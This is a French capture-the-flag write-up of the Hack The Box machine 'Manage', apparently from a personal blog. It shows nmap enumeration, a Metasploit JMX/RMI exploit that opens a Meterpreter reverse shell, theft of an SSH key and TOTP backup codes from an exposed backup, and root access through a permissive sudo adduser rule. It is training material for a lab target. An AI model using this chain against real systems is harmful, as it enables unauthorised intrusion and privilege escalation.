---



# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

title: "Manage"
slug: "manage"
date: 2025-11-16T17:00:10+01:00
lastmod: 2025-11-16T17:00:10+01:00
draft: false

# --- PaperMod / navigation ---
type: "writeups"
summary: "RMI exposé sur Tomcat ouvrant un accès JMX vulnérable exploité via Metasploit."
description: "Analyse de Manage (HTB Easy) : énumération claire de la surface d’attaque, compréhension des faiblesses de l’application web et méthode structurée pour l’escalade."
tags: ["Easy","Tomcat","JMX","Metasploit"]
categories: ["Mes writeups"]

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "Machine Manage HTB Easy avec faille web menant à l’escalade de privilèges"
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Manage"
  difficulty: "Easy"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","Web","Privilege Escalation"]
  time_spent: "4h"
  # vpn_ip: "10.10.14.xx"
  # notes: "Points d'attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true
---

<!-- ====================================================================
Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Manage> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

Au départ, les scans Nmap classiques ne donnent rien d'exploitable : juste un Tomcat sur 8080, quelques ports classiques, aucune page intéressante dans les répertoires et aucun vhost valable. 

C'est le scan agressif qui met en lumière quelque chose d'inhabituel : deux ports liés à Java RMI (2222 et 45931). 

L'association RMI + Tomcat nous offre une piste intéressante : un accès JMX potentiellement mal sécurisé… qui s'avérera être la clé de l'exploitation.

---

## Énumération

Pour démarrer, lançons mon script d'énumération {{< script "mon-nouveau-nmap" >}} :

```bash
mon-nouveau-nmap manage.htb

# Résultats dans le répertoire mes_scans/
#  - mes_scans/full_tcp_scan.txt
#  - mes_scans/aggressive_vuln_scan.txt
#  - mes_scans/cms_vuln_scan.txt
#  - mes_scans/udp_vuln_scan.txt
```

### Scan initial 

Le scan initial TCP complet (mes_scans/full_tcp_scan.txt) révèle les ports ouverts suivants :

```bash
# Nmap 7.95 scan initiated Mon Nov 17 16:58:19 2025 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 --max-retries 3 -oN mes_scans/full_tcp_scan.txt manage.htb
Nmap scan report for manage.htb (10.129.234.57)
Host is up (0.0083s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
2222/tcp  open  EtherNetIP-1
8080/tcp  open  http-proxy
35627/tcp open  unknown
42277/tcp open  unknown

# Nmap done at Mon Nov 17 16:58:27 2025 -- 1 IP address (1 host up) scanned in 7.43 seconds

```

### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.

Voici le résultat (mes_scans/aggresive_vuln_scan.txt) :

```bash
[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour manage.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"22,2222,8080,35627,42277" --script="http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params" --script-timeout=30s -T4 "manage.htb"

# Nmap 7.95 scan initiated Mon Nov 17 16:58:27 2025 as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,2222,8080,35627,42277 --script=http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params --script-timeout=30s -T4 -oN mes_scans/aggressive_vuln_scan_raw.txt manage.htb
Nmap scan report for manage.htb (10.129.234.57)
Host is up (0.0077s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
2222/tcp  open  java-rmi   Java RMI
8080/tcp  open  http       Apache Tomcat 10.1.19
35627/tcp open  tcpwrapped
42277/tcp open  java-rmi   Java RMI
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT     ADDRESS
1   7.57 ms 10.10.14.1
2   8.06 ms manage.htb (10.129.234.57)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 17 16:58:41 2025 -- 1 IP address (1 host up) scanned in 13.92 seconds

```

### Scan ciblé CMS

Le scan ciblé CMS (`mes_scans/cms_vuln_scan.txt`) ne met rien de vraiment exploitable en évidence pour ce CTF.

```bash
# Nmap 7.95 scan initiated Wed Nov 19 15:55:17 2025 as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,2222,8080,34827,40961 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN mes_scans/cms_vuln_scan.txt manage.htb
Nmap scan report for manage.htb (10.129.144.215)
Host is up (0.012s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
2222/tcp  open  java-rmi   Java RMI
8080/tcp  open  http       Apache Tomcat 10.1.19
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-headers: 
|   Content-Type: text/html;charset=UTF-8
|   Transfer-Encoding: chunked
|   Date: Wed, 19 Nov 2025 14:55:12 GMT
|   Connection: close
|   
|_  (Request type: HEAD)
|_http-title: Apache Tomcat/10.1.19
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; css: 1; ico: 1; svg: 1
|   Longest directory structure:
|     Depth: 0
|     Dir: /
|   Total files found (by extension):
|_    Other: 1; css: 1; ico: 1; svg: 1
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
34827/tcp open  java-rmi   Java RMI
40961/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 19 15:55:58 2025 -- 1 IP address (1 host up) scanned in 41.24 seconds

```



### Scan UDP rapide

Le scan UDP rapide (`mes_scans/udp_vuln_scan.txt`) ne met rien de vraiment exploitable en évidence pour ce CTF.

```bash
# Nmap 7.95 scan initiated Wed Nov 19 15:55:59 2025 as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN mes_scans/udp_vuln_scan.txt manage.htb
Nmap scan report for manage.htb (10.129.144.215)
Host is up (0.0086s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   open|filtered ntp
135/udp   closed        msrpc
137/udp   open|filtered netbios-ns
138/udp   closed        netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp open|filtered unknown

# Nmap done at Wed Nov 19 15:56:08 2025 -- 1 IP address (1 host up) scanned in 9.76 seconds

```



### Scan des répertoires

Pour la partie découverte de chemins web, j'utilise mon script dédié {{< script "mon-recoweb" >}} sur le service Tomcat :

```bash
=== mon-recoweb manage.htb START ===
Script       : mon-recoweb
Version      : mon-recoweb 2.1.2
Date         : 2025-11-19 16:09:38
Domaine      : manage.htb
IP           : 10.129.144.215
Mode         : large
Wordlist eff.: /tmp/mon-recoweb_manage.htb_wl.75meZS
Master       : /usr/share/wordlists/dirb/common.txt
Codes        : all  (strict=0)

DIR totaux bruts   : 9
DIR totaux uniques : 7
  - /docs
  - /examples
  - /favicon.ico
  - /host-manager
  - /manager
  - /meta-inf
  - /web-inf

--- Détails par port ---
Port 8080 (http)
  whatweb :
    http://manage.htb:8080/ [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.144.215], Title[Apache Tomcat/10.1.19]
  Baseline: code=404 size=765 words=68 (/shoisqhc51rnd)
  DIR (9)
    - /docs
    - /examples
    - /favicon.ico
    - /host-manager
    - /manager
    - /meta-inf
    - /META-INF
    - /web-inf
    - /WEB-INF



=== mon-recoweb manage.htb END ===



```

### Scan des vhosts

Enfin, je teste rapidement la présence de vhosts  avec  {{< script "mon-subdomains" >}} :

```bash
=== mon-subdomains manage.htb START ===
Script       : mon-subdomains
Version      : mon-subdomains 2.1.1
Date         : 2025-11-19 16:18:13
Domaine      : manage.htb
IP           : 10.129.144.215
Mode         : fast
Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
Codes        : all  (strict=0)

VHOST totaux : 0
  - (aucun)

--- Détails par port ---
Port 8080 (http)
  Baseline: code=200 size=11219 words=490 (Host=d88olulhturnd.manage.htb)
  VHOST (0)
    - (aucun)



=== mon-subdomains manage.htb END ===


```


---

## Exploitation – Prise pied (Foothold)

### analyse des résultats

- Les résultats du scan des répertoires nous donne :

  - `http://manage.htb:8080/` : page d'accueil Tomcat par défaut

  - Redirections **302** vers quelques applications internes Tomcat :
    - `/docs`
    - `/examples`
    - `/manager`
    - `/host-manager`


En approfondissant sur `/docs` et `/examples` (nouveaux `mon-recoweb` ciblés), aucun répertoire ou fichier applicatif intéressant n'est découvert : uniquement la documentation Tomcat standard et les exemples, sans appli custom de type “manage” ou panneau d'admin dédié.

- Le scan agressif montre :

  - **Tomcat 10.1.19** sur le port **8080/tcp**

  - Deux services **Java RMI** sur **2222/tcp** et **45931/tcp** 

  - Aucun script Nmap “http-vuln-*” ne remonte de vulnérabilité web évidente


**Le scan parvient à à interroger le registre RMI**. Si le registre répond, c'est qu'il n'exige **ni authentification**, ni **politique de sécurité**, ni **filtrage IP**.

- Dès que **jmxrmi apparaît**, on sait que :

  - il existe une interface **JMX Remote**,

  - elle n'est pas protégée,

  - elle est probablement exploitable via `java_jmx_server` (Metasploit) .

- Je recentre donc  l'analyse sur :

  - **Tomcat /manager** 

  - et surtout la **présence des deux services Java RMI**, qui serviront de point d'entrée pour l'exploitation ultérieure.


- Un scan complémentaire NMAP NSE orienté **rmi** va nous donner plus d'infos

```bash
nmap --script "rmi*" -sV -p 2222 manage.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 16:35 CET
Nmap scan report for manage.htb (10.129.144.215)
Host is up (0.0075s latency).

PORT     STATE SERVICE  VERSION
2222/tcp open  java-rmi Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:34827
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.01 seconds

```

Sur cette machine, le script montre clairement que le serveur RMI accepte des connexions distantes sans authentification. L'entrée `jmxrmi` est accessible, signe d'une configuration Tomcat vulnérable. Une interface JMX ouverte ainsi vers l'extérieur équivaut à une exécution de code à distance. 

Une recherche Web sur "Metasploit modules Java RMI JMX" va livrer:

- **Java JMX Server Insecure Configuration Java Code Execution**
  - Module : `exploit/multi/misc/java_jmx_server`
  - Description : Ce module tire parti d'une configuration non sécurisée de l'interface JMX, permettant de charger des classes depuis une URL HTTP distante. Il est efficace contre les interfaces JMX sans authentification ou avec une configuration faible (par exemple, si `com.sun.management.jmxremote.authenticate=false`).
  - Source : <a href="https://blog.pentesteracademy.com/java-jmx-server-insecure-configuration-java-code-execution-295421a452f7" target="_blank" rel="noopener noreferrer">Pentester Academy</a>

Cette confirmation va me permettre de tester le module Metasploit `java_jmx_server` qui devrait nous fournir un shell `meterpreter`. 



### Metasploit

- Exploit dans metasploit

```bash
msfconsole               
Metasploit tip: Use check before run to confirm if a target is 
vulnerable
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.4.96-dev                                ]
+ -- --=[ 2,569 exploits - 1,316 auxiliary - 1,683 payloads     ]
+ -- --=[ 433 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > search jmx rmi

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/multi/misc/java_jmx_server          2013-05-22       excellent  Yes    Java JMX Server Insecure Configuration Java Code Execution
   1  auxiliary/scanner/misc/java_jmx_server      2013-05-22       normal     No     Java JMX Server Insecure Endpoint Code Execution Scanner
   2  exploit/multi/misc/java_rmi_server          2011-10-15       excellent  Yes    Java RMI Server Insecure Default Configuration Java Code Execution
   3    \_ target: Generic (Java Payload)         .                .          .      .
   4    \_ target: Windows x86 (Native Payload)   .                .          .      .
   5    \_ target: Linux x86 (Native Payload)     .                .          .      .
   6    \_ target: Mac OS X PPC (Native Payload)  .                .          .      .
   7    \_ target: Mac OS X x86 (Native Payload)  .                .          .      .


Interact with a module by name or index. For example info 7, use 7 or use exploit/multi/misc/java_rmi_server
After interacting with a module you can manually set a TARGET with set TARGET 'Mac OS X x86 (Native Payload)'

msf > use 0
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf exploit(multi/misc/java_jmx_server) > options

Module options (exploit/multi/misc/java_jmx_server):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   JMXRMI        jmxrmi           yes       The name where the JMX RMI interface is bound
   JMX_PASSWORD                   no        The password to interact with an authenticated JMX endpoint
   JMX_ROLE                       no        The role to interact with an authenticated JMX endpoint
   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
                                            /basics/using-metasploit.html
   RPORT                          yes       The target port (TCP)
   SRVHOST       0.0.0.0          yes       The local host or network interface to listen on. This must be an address
                                             on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT       8080             yes       The local port to listen on.
   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                        no        The URI to use for this exploit (default is random)


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.252    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Generic (Java Payload)



View the full module info with the info, or info -d command.

msf exploit(multi/misc/java_jmx_server) > set RHOST manage.htb
RHOST => manage.htb
msf exploit(multi/misc/java_jmx_server) > set RPORT 2222
RPORT => 2222
msf exploit(multi/misc/java_jmx_server) > set LHOST tun0
LHOST => 10.10.14.152
msf exploit(multi/misc/java_jmx_server) > exploit
[*] Started reverse TCP handler on 10.10.14.152:4444 
[*] 10.129.234.57:2222 - Using URL: http://10.10.14.152:8080/yedsBc
[*] 10.129.234.57:2222 - Sending RMI Header...
[*] 10.129.234.57:2222 - Discovering the JMXRMI endpoint...
[+] 10.129.234.57:2222 - JMXRMI endpoint on 127.0.1.1:33659
[*] 10.129.234.57:2222 - Proceeding with handshake...
[+] 10.129.234.57:2222 - Handshake with JMX MBean server on 127.0.1.1:33659
[*] 10.129.234.57:2222 - Loading payload...
[*] 10.129.234.57:2222 - Replied to request for mlet
[*] 10.129.234.57:2222 - Replied to request for payload JAR
[*] 10.129.234.57:2222 - Executing payload...
[*] 10.129.234.57:2222 - Replied to request for payload JAR
[*] 10.129.234.57:2222 - Replied to request for payload JAR
[*] Sending stage (58073 bytes) to 10.129.234.57
[*] Meterpreter session 1 opened (10.10.14.152:4444 -> 10.129.234.57:59886) at 2025-11-20 10:19:57 +0100
[*] 10.129.234.57:2222 - Server stopped.

meterpreter >
```

- On explore le shell et on trouve facilement **le flag user.txt**

```bash
meterpreter > search -f user.txt
Found 1 result...
=================

Path                  Size (bytes)  Modified (UTC)
----                  ------------  --------------
/opt/tomcat/user.txt  33            2025-04-14 09:32:58 +0200

meterpreter > cat /opt/tomcat/user.txt
a86dxxxxxxxxxxxxxxxxxxxxxxxxxxxx279
```

- on continue l'exploration et on trouve les home directories de deux utilisateurs: karl et useradmin
- ces deux répertoires sont accessibles par notre utilisateur tomcat

```
meterpreter > getuid
Server username: tomcat

meterpreter > ls -la /home
Listing: /home
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040554/r-xr-xr--  4096  dir   2025-04-14 09:26:50 +0200  karl
040554/r-xr-xr--  4096  dir   2025-06-26 11:58:52 +0200  useradmin
```

- l'exploration de /home/karl ne donne rien d'intéressant

```bash
meterpreter > ls -la /home/karl
Listing: /home/karl
===================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
000667/rw-rw-rwx  0     fif   2025-11-19 23:05:26 +0100  .bash_history
100445/r--r--r-x  220   fil   2022-01-06 17:23:33 +0100  .bash_logout
100445/r--r--r-x  3771  fil   2022-01-06 17:23:33 +0100  .bashrc
040001/--------x  4096  dir   2024-03-01 05:24:20 +0100  .cache
040555/r-xr-xr-x  4096  dir   2025-04-14 09:26:50 +0200  .local
100445/r--r--r-x  807   fil   2022-01-06 17:23:33 +0100  .profile
040001/--------x  4096  dir   2025-04-14 09:24:59 +0200  .ssh
100445/r--r--r-x  0     fil   2024-03-01 05:25:10 +0100  .sudo_as_admin_successful

meterpreter > cat /home/karl/.bash_history
meterpreter > cat /home/karl/.sudo_as_admin_successful
meterpreter >

```

- on passe à /home/useradmin

```bash
meterpreter > ls -la /home/useradmin
Listing: /home/useradmin
========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
000667/rw-rw-rwx  0     fif   2025-11-19 23:05:26 +0100  .bash_history
100445/r--r--r-x  220   fil   2024-06-21 17:46:55 +0200  .bash_logout
100445/r--r--r-x  3771  fil   2024-06-21 17:46:55 +0200  .bashrc
040001/--------x  4096  dir   2024-06-21 18:48:52 +0200  .cache
100001/--------x  200   fil   2024-06-21 18:48:52 +0200  .google_authenticator
100445/r--r--r-x  807   fil   2024-06-21 17:46:55 +0200  .profile
040555/r-xr-xr-x  4096  dir   2024-06-21 17:53:55 +0200  .ssh
040554/r-xr-xr--  4096  dir   2024-06-21 18:51:00 +0200  backups

meterpreter > cat /home/useradmin/.bash_history
meterpreter >

```

- on trouve un répertoire backups accessible par notre utilisateur tomcat avec un backup.tar.gz qu'on télécharge

```bash
meterpreter > ls -la /home/useradmin/backups
Listing: /home/useradmin/backups
================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  3088  fil   2024-06-21 18:50:37 +0200  backup.tar.gz

meterpreter >

meterpreter > ls -la /home/useradmin/backups
Listing: /home/useradmin/backups
================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  3088  fil   2024-06-21 18:50:37 +0200  backup.tar.gz

meterpreter > download /home/useradmin/backups/backup.tar.gz
[*] Downloading: /home/useradmin/backups/backup.tar.gz -> /mnt/kvm-md0/HTB/manage/backup.tar.gz
[*] Downloaded 3.02 KiB of 3.02 KiB (100.0%): /home/useradmin/backups/backup.tar.gz -> /mnt/kvm-md0/HTB/manage/backup.tar.gz
[*] Completed  : /home/useradmin/backups/backup.tar.gz -> /mnt/kvm-md0/HTB/manage/backup.tar.gz
meterpreter >
```



### Exploitation de backup.tar.gz dans kali linux

```bash
ls -l
total 4
-rw-r--r-- 1 kali kali 3088 Jun 21  2024 backup.tar.gz
drwxr-xr-x 2 kali kali    0 Nov 19 16:17 mes_scans
                                                                                                                       
tar -xvzf backup.tar.gz
./
./.bash_logout
./.profile
./.ssh/
./.ssh/id_ed25519
./.ssh/authorized_keys
./.ssh/id_ed25519.pub
./.bashrc
./.google_authenticator
./.cache/
./.cache/motd.legal-displayed
./.bash_history
tar: ./.bash_history: Cannot create symlink to ‘/dev/null': Operation not supported
tar: Exiting with failure status due to previous errors
                                                                                                                       
 ls -la
total 20
drwxr-xr-x 2 kali kali    0 Jun 21  2024 .
drwxr-xr-x 2 kali kali    0 Nov 17 16:57 ..
-rw-r--r-- 1 kali kali 3088 Jun 21  2024 backup.tar.gz
-rw-r--r-- 1 kali kali  220 Jun 21  2024 .bash_logout
-rw-r--r-- 1 kali kali 3771 Jun 21  2024 .bashrc
drwxr-xr-x 2 kali kali    0 Jun 21  2024 .cache
-r--r--r-- 1 kali kali  200 Jun 21  2024 .google_authenticator
drwxr-xr-x 2 kali kali    0 Nov 19 16:17 mes_scans
-rw-r--r-- 1 kali kali  807 Jun 21  2024 .profile
drwxr-xr-x 2 kali kali    0 Jun 21  2024 .ssh
                                                                                       
```

- explorons le contenu de  .google_authenticator

```bash
cat .google_authenticator                   
CLSSSMHYGLENX5HAIFBQ6L35UM
" RATE_LIMIT 3 30 1718988529
" WINDOW_SIZE 3
" DISALLOW_REUSE 57299617
" TOTP_AUTH
99852083
20312647
73235136
92971994
86175591
98991823
54032641
69267218
76839253
56800775
                                                                                       
```

- le répertoire .ssh contient **une copie des clés de l'utilisateur useradmin**

```bash
ls -la .ssh                                    
total 12
drwxr-xr-x 2 kali kali   0 Jun 21  2024 .
drwxr-xr-x 2 kali kali   0 Jun 21  2024 ..
-rw-r--r-- 1 kali kali  98 Jun 21  2024 authorized_keys
-rw-r--r-- 1 kali kali 411 Jun 21  2024 id_ed25519
-rw-r--r-- 1 kali kali  98 Jun 21  2024 id_ed25519.pub

```



---

## Escalade de privilèges

### connexion à manage.htb

```bash
cp .ssh/id* /home/kali/tmp/ 

cd /home/kali/tmp/
chmod 600 id_ed25519

ssh -i id_ed25519 useradmin@manage.htb

cp: cannot stat '.ssh/id*': No such file or directory
(useradmin@manage.htb) Verification code:
```

- pour le `Verification code` j'utilise un des codes de `.google_authenticator` par exemple le premier `99852083`

```bash
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Nov 21 09:39:17 AM UTC 2025

  System load:           0.0
  Usage of /:            73.8% of 4.34GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             212
  Users logged in:       0
  IPv4 address for eth0: 10.129.35.198
  IPv6 address for eth0: dead:beef::250:56ff:fe94:6cac

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

useradmin@manage:~$
```

- nous voilà connecté à manage.htb
- commençons par le classique `sudo -l`

### sudo -l

```bash
sudo -l
Matching Defaults entries for useradmin on manage:
    env_reset, timestamp_timeout=1440, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User useradmin may run the following commands on manage:
    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
    
```

### adduser admin

- La règle sudo **(ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$** autorise useradmin à lancer `adduser` **sans mot de passe**, mais uniquement avec un argument composé de caractères alphanumériques.
- Cette restriction empêche d'ajouter directement un utilisateur à un groupe privilégié (ex. `sudo`, `adm`, etc.) puisqu'on ne peut pas passer d'options.
- Lorsqu'on crée un utilisateur `admin`, Ubuntu crée automatiquement **un groupe du même nom** : `admin`.
- **Historiquement**, dans Ubuntu, le groupe `admin` appartient aux *sudoers* et possède des droits équivalents à `sudo` (héritage des anciennes versions où `admin` = super-user local).
- **Résultat : l'utilisateur `admin` nouvellement créé peut exécuter `sudo -i` et obtenir un shell root immédiatement.**


```bash

useradmin@manage:~$ sudo adduser admin
Adding user `admin' ...
Adding new group `admin' (1003) ...
Adding new user `admin' (1003) with group `admin' ...
Creating home directory `/home/admin' ...
Copying files from `/etc/skel' ...
New password: 
Retype new password: 
passwd: password updated successfully
Changing the user information for admin
Enter the new value, or press ENTER for the default
	Full Name []: 
	Room Number []: 
	Work Phone []: 
	Home Phone []: 
	Other []: 
Is the information correct? [Y/n] 
useradmin@manage:~$

```

### su admin

```bash
useradmin@manage:~$ su admin
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@manage:/home/useradmin$ sudo -i
[sudo] password for admin: 
root@manage:~# ls -l
total 8
-rw-r----- 1 root root   33 Apr 14  2025 root.txt
drwx------ 3 root root 4096 Mar  1  2024 snap
root@manage:~#
root@manage:~# cat root.txt
b364xxxxxxxxxxxxxxxxxxxxxxxxdc34
```



---

## Conclusion

Cette machine illustre une chaîne d'exploitation centrée sur **Tomcat** : un simple port **RMI/JMX exposé** permet d'injecter du code distant et d'obtenir un premier accès via Metasploit.

La fouille du système révèle ensuite un **backup mal protégé** contenant une clé SSH valide, ouvrant la voie vers l'utilisateur *useradmin*. 

À partir de là, l'analyse de `sudo -l` montre une configuration trop permissive du binaire `adduser`, permettant de créer un compte *admin* automatiquement doté de privilèges complets — et donc l'accès root.

---

